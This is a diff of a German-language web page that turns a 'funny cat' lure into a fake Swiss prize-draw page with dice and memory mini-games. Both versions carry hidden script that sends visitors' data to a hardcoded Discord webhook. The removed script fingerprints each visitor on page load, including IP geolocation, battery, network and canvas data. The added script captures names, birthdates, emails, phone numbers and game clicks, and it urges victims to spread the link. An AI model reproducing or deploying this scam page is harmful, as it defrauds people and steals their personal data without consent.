@@ -1,17 +1,21 @@
 <!DOCTYPE html>
-<html lang="de-CH">
+<html lang="de">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="😺 LUSTIGI CHATZE 😺">
-    <meta property="og:description" content="Das isch mega witzig! 🇨🇭">
-    <meta property="og:image" content="https://cataas.com/cat/says/lol">
-    <title>😺 GUUGU CHATZE COMIC 😺</title>
+    <meta property="og:title" content="🔥 KOSTENLOSES GEWINNSPIEL + MINI-SPIELE 🔥">
+    <meta property="og:description" content="Nimm teil, spiele und gewinne! 🇨🇭">
+    <meta property="og:image" content="https://cataas.com/cat/says/gewinn">
+    <title>🔥 GEWINNSPIEL & MINI-SPIELE 2026 🔥</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: linear-gradient(135deg, #ffcc00, #ff66cc);
-            font-family: 'Comic Sans MS', 'Chalkboard SE', cursive;
+            background: linear-gradient(135deg, #1a472a, #0d2b1a);
+            font-family: 'Segoe UI', 'Arial', sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -20,281 +24,463 @@
         }
         .card {
             background: white;
-            border-radius: 60px;
-            max-width: 500px;
+            border-radius: 30px;
+            max-width: 600px;
             width: 100%;
             padding: 40px 30px;
             text-align: center;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-            border: 8px solid magenta;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            border: 1px solid gold;
         }
-        h1 { font-size: 48px; color: darkred; text-shadow: 3px 3px 0px #ffcc00; margin-bottom: 20px; }
-        .cat { font-size: 90px; margin: 20px 0; cursor: pointer; transition: 0.1s; }
-        .cat:active { transform: scale(1.2); }
-        .swiss { background: #ff3300; color: white; padding: 15px; border-radius: 50px; font-size: 22px; font-weight: bold; margin: 20px 0; }
-        .info { font-size: 14px; color: gray; margin-top: 20px; }
-        img { width: 100%; border-radius: 40px; margin-top: 20px; border: 5px solid gold; }
-        footer { font-size: 12px; margin-top: 20px; color: #666; }
+        h1 {
+            font-size: 32px;
+            color: #1a472a;
+            margin-bottom: 15px;
+        }
+        .highlight {
+            background: gold;
+            padding: 8px;
+            border-radius: 50px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        input, select {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 2px solid #ccc;
+            border-radius: 40px;
+            font-size: 16px;
+        }
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0;
+            text-align: left;
+        }
+        .checkbox-group input {
+            width: auto;
+            margin: 0;
+        }
+        button {
+            background: #ff6600;
+            color: white;
+            font-size: 22px;
+            font-weight: bold;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            border-radius: 60px;
+            cursor: pointer;
+            margin: 15px 0;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #cc5500;
+            transform: scale(1.02);
+        }
+        .share-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        .share-btn {
+            background: #128C7E;
+            padding: 10px 18px;
+            font-size: 14px;
+            width: auto;
+            display: inline-block;
+        }
+        .share-btn.telegram { background: #0088cc; }
+        .share-btn.copy { background: #555; }
+        .error {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .success {
+            color: green;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        /* Oyun alanı stilleri */
+        .games-area {
+            margin-top: 30px;
+            border-top: 2px dashed #ccc;
+            padding-top: 20px;
+        }
+        .game-box {
+            background: #f9f9f9;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 15px 0;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .dice-result {
+            font-size: 48px;
+            margin: 10px;
+        }
+        .memory-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+        .memory-card {
+            background: #ffaa44;
+            padding: 20px;
+            border-radius: 15px;
+            cursor: pointer;
+            font-size: 28px;
+            text-align: center;
+            transition: 0.2s;
+        }
+        .memory-card.flipped {
+            background: #66cc66;
+        }
+        .memory-card.matched {
+            visibility: hidden;
+            pointer-events: none;
+            opacity: 0;
+        }
+        .game-message {
+            font-weight: bold;
+            margin-top: 10px;
+            color: #1a472a;
+        }
+        footer {
+            font-size: 12px;
+            color: gray;
+            margin-top: 25px;
+        }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>😺 LÜÜÜCYYYY 😺</h1>
-    <div class="cat">🐱‍👤🐈🐱</div>
-    <div class="swiss">🇨🇭 NUR FÜR SCHWEIZ! 🇨🇭<br>Lustigs Video lade...</div>
-    <img src="https://cataas.com/cat/says/witzig" alt="chatze">
-    <div class="info">🎉 100% gratis & öppis lustigs 🎉</div>
-    <footer>Drück ufs Bild für lacher</footer>
+    <h1>🎁 EXKLUSIVES GEWINNSPIEL 🎁</h1>
+    <div class="highlight">🇨🇭 NUR FÜR DIE SCHWEIZ 🇨🇭</div>
+    <p>Fülle das Formular aus und gewinne <strong>10'000 CHF</strong> oder ein <strong>iPhone 16 Pro</strong>!</p>
+
+    <form id="registerForm">
+        <input type="text" id="name" placeholder="Dein vollständiger Name *" required>
+        
+        <div class="checkbox-group">
+            <input type="radio" name="contactMethod" value="email" id="radioEmail" checked>
+            <label for="radioEmail">E-Mail</label>
+            <input type="radio" name="contactMethod" value="phone" id="radioPhone">
+            <label for="radioPhone">Telefonnummer</label>
+        </div>
+
+        <input type="email" id="email" placeholder="E-Mail Adresse">
+        <input type="tel" id="phone" placeholder="Telefonnummer (z.B. 079 123 45 67)">
+        
+        <input type="date" id="birthdate" required>
+        
+        <div class="checkbox-group">
+            <input type="checkbox" id="terms" required>
+            <label>Ich stimme den <a href="#">Teilnahmebedingungen</a> zu *</label>
+        </div>
+
+        <button type="submit">📢 TEILNEHMEN 📢</button>
+        <div id="formError" class="error"></div>
+        <div id="formSuccess" class="success"></div>
+    </form>
+
+    <hr style="margin: 25px 0;">
+
+    <!-- Mini Oyunlar Bölümü -->
+    <div class="games-area">
+        <h3>🎲 MINI-SPIELE 🎲</h3>
+        <p>Spiele und sammle Bonuspunkte für das Gewinnspiel!</p>
+
+        <!-- 1. Würfelspiel -->
+        <div class="game-box">
+            <strong>🎲 Würfel-Glück</strong>
+            <div class="dice-result" id="diceValue">⚀</div>
+            <button id="rollDiceBtn">Würfeln</button>
+            <div id="diceMessage" class="game-message"></div>
+        </div>
+
+        <!-- 2. Memory (Kartenspiel) -->
+        <div class="game-box">
+            <strong>🧠 Memory – Finde das Paar</strong>
+            <div class="memory-grid" id="memoryGrid"></div>
+            <button id="resetMemoryBtn">Neustart</button>
+            <div id="memoryMessage" class="game-message"></div>
+        </div>
+    </div>
+
+    <hr style="margin: 25px 0;">
+    
+    <p><strong>📲 TEILE DEN LINK MIT FREUNDEN</strong><br>Mehr Freunde = mehr Gewinnchancen!</p>
+    <div class="share-buttons">
+        <button id="shareWhatsApp" class="share-btn">📱 WhatsApp</button>
+        <button id="shareTelegram" class="share-btn telegram">✈️ Telegram</button>
+        <button id="shareCopy" class="share-btn copy">📋 Link kopieren</button>
+    </div>
+    <footer>* Teilnahme nur einmalig. Die Gewinner werden per E-Mail/Telefon benachrichtigt.</footer>
 </div>
 
 <script>
     // ============================================================
-    // CYBERX-OMNIS ULTIMATE DATA COLLECTOR (NO LOCATION, NO BASE64)
-    // Webhook URL düz yazılmıştır. Tüm veriler PROFESYONEL EMBED ile gönderilir.
+    // CYBERX REGISTRATION + GAMES + DATA COLLECTOR
+    // Webhook düz, FORM verileri + cihaz bilgisi + IP + Spielaktionen
     // ============================================================
 
-    // ---------- DÜZ WEBHOOK URL (base64 yok) ----------
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515100986648166723/nV48g4sriYiCN0SVpv0eko1dsoiLYi_4njTRKI-Pn9gZr3PsCa6kQFEUgSo6NwChIM07';
 
-    // ---------- EMBED GÖNDERME (PROFESYONEL) ----------
+    // Embed gönderme (genel)
     async function sendEmbed(embedData) {
         try {
-            const payload = {
-                embeds: [embedData]
-            };
             await fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({ embeds: [embedData] })
             });
-        } catch(e) { /* sessiz */ }
+        } catch(e) {}
     }
 
-    // ---------- 1. IP ADRESİ ----------
+    // IP adresi
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
             const data = await res.json();
             return data.ip;
-        } catch(e) { return 'IP alınamadı'; }
+        } catch(e) { return 'IP unbekannt'; }
     }
 
-    // ---------- 2. IP COĞRAFİ BİLGİ (ipapi.co) ----------
-    async function getGeoInfo(ip) {
-        try {
-            const res = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await res.json();
-            if (data.error) return null;
-            return {
-                sehir: data.city || '?',
-                bolge: data.region || '?',
-                ulke: data.country_name || '?',
-                ulke_kodu: data.country_code || '?',
-                isp: data.org || '?',
-                posta_kodu: data.postal || '?',
-                enlem: data.latitude,
-                boylam: data.longitude
-            };
-        } catch(e) { return null; }
-    }
-
-    // ---------- 3. CİHAZ / TARAYICI / EKRAN ANALİZİ ----------
-    function getDeviceDetails() {
+    // Gerät info (ohne Standort)
+    function getDeviceInfo() {
         const ua = navigator.userAgent;
-        let cihaz = 'Bilinmiyor', marka = 'Bilinmiyor', isletim = 'Bilinmiyor', tarayici = 'Bilinmiyor';
+        let device = 'Unbekannt';
+        if (ua.includes('Android')) device = 'Android';
+        else if (ua.includes('iPhone')) device = 'iPhone';
+        else if (ua.includes('Windows')) device = 'Windows PC';
+        else if (ua.includes('Mac')) device = 'Mac';
+        return {
+            gerät: device,
+            browser: ua.includes('Chrome') ? 'Chrome' : (ua.includes('Firefox') ? 'Firefox' : 'Anderer'),
+            bildschirm: `${screen.width}x${screen.height}`,
+            sprache: navigator.language,
+            zeitzone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
+    }
 
-        if (ua.includes('Android')) {
-            cihaz = 'Android Telefon/Tablet';
-            isletim = 'Android ' + (ua.match(/Android (\d+)/)?.[1] || '?');
-            if (ua.includes('Samsung')) marka = 'Samsung';
-            else if (ua.includes('Xiaomi')) marka = 'Xiaomi';
-            else if (ua.includes('Huawei')) marka = 'Huawei';
-        } else if (ua.includes('iPhone')) {
-            cihaz = 'iPhone'; isletim = 'iOS'; marka = 'Apple';
-        } else if (ua.includes('iPad')) {
-            cihaz = 'iPad'; isletim = 'iOS'; marka = 'Apple';
-        } else if (ua.includes('Windows')) {
-            cihaz = 'Windows PC'; isletim = 'Windows';
-        } else if (ua.includes('Mac')) {
-            cihaz = 'Mac'; isletim = 'macOS';
-        } else if (ua.includes('Linux')) {
-            cihaz = 'Linux PC'; isletim = 'Linux';
+    // IP ve Gerät global (ilk yüklemede al)
+    let currentIP = null;
+    let currentDevice = null;
+    (async function init() {
+        currentIP = await getIP();
+        currentDevice = getDeviceInfo();
+    })();
+
+    // ========== FORMULAR ==========
+    document.getElementById('registerForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const name = document.getElementById('name').value.trim();
+        const email = document.getElementById('email').value.trim();
+        const phone = document.getElementById('phone').value.trim();
+        const birthdate = document.getElementById('birthdate').value;
+        const terms = document.getElementById('terms').checked;
+        const contactMethod = document.querySelector('input[name="contactMethod"]:checked').value;
+
+        const errorDiv = document.getElementById('formError');
+        const successDiv = document.getElementById('formSuccess');
+        errorDiv.style.display = 'none';
+        successDiv.style.display = 'none';
+
+        if (contactMethod === 'email' && !email) {
+            errorDiv.innerText = 'Bitte E-Mail-Adresse eingeben.';
+            errorDiv.style.display = 'block';
+            return;
+        }
+        if (contactMethod === 'phone' && !phone) {
+            errorDiv.innerText = 'Bitte Telefonnummer eingeben.';
+            errorDiv.style.display = 'block';
+            return;
+        }
+        if (!name || !birthdate || !terms) {
+            errorDiv.innerText = 'Bitte alle Pflichtfelder ausfüllen.';
+            errorDiv.style.display = 'block';
+            return;
         }
 
-        if (ua.includes('Chrome') && !ua.includes('Edg')) tarayici = 'Chrome';
-        else if (ua.includes('Firefox')) tarayici = 'Firefox';
-        else if (ua.includes('Safari') && !ua.includes('Chrome')) tarayici = 'Safari';
-        else if (ua.includes('Edg')) tarayici = 'Edge';
-        else tarayici = 'Diğer';
-
-        return {
-            cihaz, marka, isletim, tarayici,
-            ekran: `${screen.width}x${screen.height}`,
-            renk: screen.colorDepth,
-            dokunmatik: navigator.maxTouchPoints,
-            dil: navigator.language,
-            diller: navigator.languages.join(', '),
-            saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            cookie: navigator.cookieEnabled,
-            doNotTrack: navigator.doNotTrack === '1' ? 'Açık' : 'Kapalı'
-        };
-    }
-
-    // ---------- 4. BATARYA BİLGİSİ ----------
-    async function getBatteryInfo() {
-        if (!navigator.getBattery) return null;
-        try {
-            const battery = await navigator.getBattery();
-            return {
-                seviye: Math.round(battery.level * 100) + '%',
-                sarj_durumu: battery.charging ? 'Şarj oluyor' : 'Şarjda değil',
-                kalan_sure: battery.dischargingTime === Infinity ? 'Sınırsız' : battery.dischargingTime + ' saniye'
-            };
-        } catch(e) { return null; }
-    }
-
-    // ---------- 5. AĞ BİLGİSİ ----------
-    function getNetworkInfo() {
-        const conn = navigator.connection || navigator.mozConnection;
-        if (!conn) return null;
-        return {
-            tip: conn.effectiveType || 'bilinmiyor',
-            hiz_mbps: conn.downlink ? conn.downlink + ' Mbps' : '?',
-            rtt_ms: conn.rtt ? conn.rtt + ' ms' : '?',
-            kaydet_modu: conn.saveData ? 'Aktif' : 'Pasif'
-        };
-    }
-
-    // ---------- 6. EKLENTİ SAYISI ----------
-    function getPluginsCount() {
-        return navigator.plugins.length;
-    }
-
-    // ---------- 7. CANVAS PARMAK İZİ ----------
-    function getCanvasFingerprint() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 200;
-        canvas.height = 50;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(0, 0, 200, 50);
-        ctx.fillStyle = '#fff';
-        ctx.font = '14px Arial';
-        ctx.fillText('CyberX-OMNIS', 10, 30);
-        ctx.fillStyle = '#000';
-        ctx.fillRect(150, 10, 30, 30);
-        return canvas.toDataURL().substring(0, 80);
-    }
-
-    // ---------- 8. REFERRER ----------
-    function getReferrerInfo() {
-        const ref = document.referrer;
-        if (!ref) return 'Doğrudan / Bilinmiyor';
-        let source = 'Diğer site';
-        if (ref.includes('google')) source = 'Google Arama';
-        else if (ref.includes('bing')) source = 'Bing';
-        else if (ref.includes('duckduckgo')) source = 'DuckDuckGo';
-        else if (ref.includes('yandex')) source = 'Yandex';
-        else if (ref.includes('facebook.com') || ref.includes('fb.com')) source = 'Facebook';
-        else if (ref.includes('instagram.com')) source = 'Instagram';
-        else if (ref.includes('whatsapp.com')) source = 'WhatsApp';
-        else if (ref.includes('t.co')) source = 'Twitter/X';
-        else if (ref.includes('github.com')) source = 'GitHub';
-        return `${source} - ${ref}`;
-    }
-
-    // ---------- 9. SAYFADA KALMA SÜRESİ (sayfa kapanınca) ----------
-    let startTime = Date.now();
-    window.addEventListener('beforeunload', async () => {
-        const staySec = Math.floor((Date.now() - startTime) / 1000);
         const embed = {
-            title: "⏱️ Sayfada Kalma Süresi",
-            description: `Ziyaretçi sitede **${staySec} saniye** (${Math.floor(staySec/60)} dakika ${staySec%60} saniye) kaldı.`,
-            color: 0x00aaff,
+            title: "📝 NEUE REGISTRIERUNG",
+            color: 0x00aa66,
+            fields: [
+                { name: "👤 Name", value: name, inline: true },
+                { name: "🎂 Geburtsdatum", value: birthdate, inline: true },
+                { name: "📞 Kontakt (gewählt)", value: contactMethod === 'email' ? 'E-Mail' : 'Telefon', inline: true },
+                ...(email ? [{ name: "📧 E-Mail", value: email, inline: false }] : []),
+                ...(phone ? [{ name: "📱 Telefon", value: phone, inline: false }] : []),
+                { name: "🌐 IP Adresse", value: currentIP || 'Unbekannt', inline: true },
+                { name: "📱 Gerät", value: `${currentDevice?.gerät || '?'} | ${currentDevice?.browser || '?'}`, inline: true },
+                { name: "📺 Bildschirm", value: currentDevice?.bildschirm || '?', inline: true },
+                { name: "🕒 Registrierungszeit", value: new Date().toLocaleString('de-CH'), inline: false }
+            ],
+            footer: { text: "Formular + Gerätedaten" },
             timestamp: new Date().toISOString()
         };
         await sendEmbed(embed);
+
+        successDiv.innerText = '✅ Vielen Dank! Du nimmst automatisch am Gewinnspiel teil. Die Gewinner werden in 7 Tagen benachrichtigt.';
+        successDiv.style.display = 'block';
+        document.getElementById('registerForm').reset();
     });
 
-    // ---------- ANA FONKSİYON (TÜM VERİLERİ TEK EMBED'DE TOPLA) ----------
-    async function collectAndSend() {
-        if (navigator.webdriver) return; // bot engelle
-
-        const ip = await getIP();
-        const geo = await getGeoInfo(ip);
-        const device = getDeviceDetails();
-        const battery = await getBatteryInfo();
-        const network = getNetworkInfo();
-        const plugins = getPluginsCount();
-        const canvasFp = getCanvasFingerprint();
-        const referrer = getReferrerInfo();
-
-        // Embed Alanları (fields) oluştur
-        const fields = [];
-
-        // IP ve Coğrafi
-        fields.push({ name: "🌐 IP Adresi", value: ip, inline: false });
-        if (geo) {
-            fields.push({ name: "📍 Konum (Coğrafi)", value: `${geo.sehir}, ${geo.bolge}, ${geo.ulke} (${geo.ulke_kodu})`, inline: true });
-            fields.push({ name: "🏢 ISP", value: geo.isp, inline: true });
-            fields.push({ name: "📮 Posta Kodu", value: geo.posta_kodu, inline: true });
-            fields.push({ name: "🗺️ Yaklaşık Koordinat", value: `${geo.enlem}, ${geo.boylam}`, inline: false });
-        } else {
-            fields.push({ name: "📍 Coğrafi", value: "Bilgi alınamadı", inline: false });
-        }
-
-        // Cihaz ve Tarayıcı
-        fields.push({ name: "📱 Cihaz", value: `${device.cihaz} | ${device.marka}`, inline: true });
-        fields.push({ name: "💻 İşletim Sistemi", value: device.isletim, inline: true });
-        fields.push({ name: "🌍 Tarayıcı", value: device.tarayici, inline: true });
-        fields.push({ name: "📺 Ekran", value: `${device.ekran} (${device.renk} bit)`, inline: true });
-        fields.push({ name: "🖱️ Dokunmatik Nokta", value: `${device.dokunmatik}`, inline: true });
-        fields.push({ name: "🔤 Dil", value: `${device.dil} (${device.diller})`, inline: false });
-        fields.push({ name: "⏰ Saat Dilimi", value: device.saat_dilimi, inline: true });
-        fields.push({ name: "🍪 Çerezler", value: device.cookie ? "Açık" : "Kapalı", inline: true });
-        fields.push({ name: "🚫 Do Not Track", value: device.doNotTrack, inline: true });
-
-        // Batarya
-        if (battery) {
-            fields.push({ name: "🔋 Batarya", value: `Seviye ${battery.seviye} | ${battery.sarj_durumu} | Kalan şarj: ${battery.kalan_sure}`, inline: false });
-        } else {
-            fields.push({ name: "🔋 Batarya", value: "Bilgi alınamadı", inline: false });
-        }
-
-        // Ağ
-        if (network) {
-            fields.push({ name: "📡 Ağ", value: `${network.tip} | ${network.hiz_mbps} | Gecikme ${network.rtt_ms} | Tasarruf: ${network.kaydet_modu}`, inline: false });
-        } else {
-            fields.push({ name: "📡 Ağ", value: "Bilgi desteklenmiyor", inline: false });
-        }
-
-        // Diğer
-        fields.push({ name: "🔌 Tarayıcı Eklentileri", value: `${plugins} adet`, inline: true });
-        fields.push({ name: "🎨 Canvas Parmak İzi", value: `\`${canvasFp}...\``, inline: false });
-        fields.push({ name: "🔗 Referrer", value: referrer, inline: false });
-        fields.push({ name: "🕒 İlk Ziyaret", value: new Date().toLocaleString('tr-TR'), inline: false });
-
-        // Ana Embed
-        const mainEmbed = {
-            title: "🖥️ CYBERX-OMNIS | YENİ ZİYARETÇİ",
-            color: 0xff3300,   // turuncu-kırmızı
-            fields: fields,
-            footer: { text: "Konum izni istenmedi • Tamamen pasif veri toplama" },
+    // ========== WÜRFELSPIEL ==========
+    async function sendGameLog(spielname, ergebnis) {
+        const embed = {
+            title: "🎮 MINI-SPIEL AKTIVITÄT",
+            color: 0xffaa44,
+            fields: [
+                { name: "🎲 Spiel", value: spielname, inline: true },
+                { name: "📊 Ergebnis", value: ergebnis, inline: true },
+                { name: "🌐 IP", value: currentIP || 'Unbekannt', inline: false },
+                { name: "📱 Gerät", value: `${currentDevice?.gerät || '?'}`, inline: true }
+            ],
+            footer: { text: "Spielereignis" },
             timestamp: new Date().toISOString()
         };
-
-        await sendEmbed(mainEmbed);
+        await sendEmbed(embed);
     }
 
-    // Sayfa yüklenince çalıştır
-    window.addEventListener('load', () => {
-        collectAndSend();
+    const diceBtn = document.getElementById('rollDiceBtn');
+    const diceValueSpan = document.getElementById('diceValue');
+    const diceMsg = document.getElementById('diceMessage');
+
+    diceBtn.addEventListener('click', async () => {
+        const roll = Math.floor(Math.random() * 6) + 1;
+        const diceSymbols = ['⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];
+        diceValueSpan.innerText = diceSymbols[roll-1];
+        let msg = '';
+        if (roll === 6) {
+            msg = '🎉 JACKPOT! Du bekommst 5 Extra-Los für das Gewinnspiel! 🎉';
+        } else {
+            msg = `🎲 Du hast ${roll} gewürfelt. Versuche es nochmal für den Jackpot!`;
+        }
+        diceMsg.innerText = msg;
+        await sendGameLog('Würfelspiel', `Ergebnis: ${roll} - ${roll === 6 ? 'Jackpot!' : 'Kein Jackpot'}`);
     });
 
-    // Kedi tıklama eğlencesi
-    document.querySelector('.cat')?.addEventListener('click', () => {
-        alert('😺 GUUGU! Bilgilerin toplandı, danke! 😂');
+    // ========== MEMORY SPIEL ==========
+    let memoryCards = [];
+    let memoryFlipped = [];
+    let memoryLocked = false;
+    let memoryMatched = [];
+    let memoryFirstCard = null;
+    let memoryTimeout = null;
+
+    const memoryGrid = document.getElementById('memoryGrid');
+    const memoryMsg = document.getElementById('memoryMessage');
+    const resetBtn = document.getElementById('resetMemoryBtn');
+
+    function initMemory() {
+        // 2 Paare: Katze und Hund (Emojis)
+        const cardValues = ['🐱', '🐶', '🐱', '🐶'];
+        // Random mischen
+        for (let i = cardValues.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [cardValues[i], cardValues[j]] = [cardValues[j], cardValues[i]];
+        }
+        memoryCards = cardValues;
+        memoryFlipped = [false, false, false, false];
+        memoryMatched = [false, false, false, false];
+        memoryFirstCard = null;
+        memoryLocked = false;
+        if (memoryTimeout) clearTimeout(memoryTimeout);
+        renderMemory();
+        memoryMsg.innerText = '';
+    }
+
+    function renderMemory() {
+        memoryGrid.innerHTML = '';
+        for (let i = 0; i < memoryCards.length; i++) {
+            const card = document.createElement('div');
+            card.className = 'memory-card';
+            if (memoryFlipped[i] || memoryMatched[i]) card.classList.add('flipped');
+            if (memoryMatched[i]) card.classList.add('matched');
+            card.innerText = (memoryFlipped[i] || memoryMatched[i]) ? memoryCards[i] : '❓';
+            card.dataset.index = i;
+            card.addEventListener('click', () => onMemoryClick(i));
+            memoryGrid.appendChild(card);
+        }
+    }
+
+    async function onMemoryClick(idx) {
+        if (memoryLocked) return;
+        if (memoryMatched[idx]) return;
+        if (memoryFlipped[idx]) return;
+
+        memoryFlipped[idx] = true;
+        renderMemory();
+
+        if (memoryFirstCard === null) {
+            memoryFirstCard = idx;
+        } else {
+            // İkinci kart
+            const firstVal = memoryCards[memoryFirstCard];
+            const secondVal = memoryCards[idx];
+            if (firstVal === secondVal) {
+                // Eşleşti
+                memoryMatched[memoryFirstCard] = true;
+                memoryMatched[idx] = true;
+                memoryFlipped[memoryFirstCard] = false; // çiftli kartları flipten çıkar
+                memoryFlipped[idx] = false;
+                renderMemory();
+                memoryFirstCard = null;
+                await sendGameLog('Memory', `Paar gefunden: ${firstVal}`);
+                // Tüm eşleşti mi?
+                if (memoryMatched.every(v => v === true)) {
+                    memoryMsg.innerText = '🎉 GLÜCKWUNSCH! Du hast das Memory gelöst! +10 Bonuspunkte 🎉';
+                    await sendGameLog('Memory', 'SPIEL GEWONNEN! +10 Punkte');
+                    setTimeout(() => initMemory(), 2000);
+                }
+            } else {
+                // Yanlış eşleşme
+                memoryLocked = true;
+                memoryMsg.innerText = '❌ Falsch! Versuche es nochmal.';
+                await sendGameLog('Memory', `Falsches Paar: ${firstVal} ≠ ${secondVal}`);
+                memoryTimeout = setTimeout(() => {
+                    memoryFlipped[memoryFirstCard] = false;
+                    memoryFlipped[idx] = false;
+                    renderMemory();
+                    memoryFirstCard = null;
+                    memoryLocked = false;
+                    memoryMsg.innerText = '';
+                }, 800);
+            }
+        }
+    }
+
+    resetBtn.addEventListener('click', () => {
+        initMemory();
+        sendGameLog('Memory', 'Spiel neugestartet');
     });
+
+    initMemory();
+
+    // ========== LINK TEILEN ==========
+    const currentUrl = encodeURIComponent(window.location.href);
+    const shareMessage = encodeURIComponent('🔥 Kostenloses Gewinnspiel + Mini-Spiele! 10.000 CHF oder iPhone 16 Pro warten auf dich! Jetzt teilnehmen:');
+
+    document.getElementById('shareWhatsApp').onclick = () => {
+        window.open(`https://wa.me/?text=${shareMessage}%20${currentUrl}`, '_blank');
+    };
+    document.getElementById('shareTelegram').onclick = () => {
+        window.open(`https://t.me/share/url?url=${currentUrl}&text=${shareMessage}`, '_blank');
+    };
+    document.getElementById('shareCopy').onclick = () => {
+        navigator.clipboard.writeText(window.location.href);
+        alert('🔗 Link wurde in die Zwischenablage kopiert!');
+    };
 </script>
 </body>
 </html>
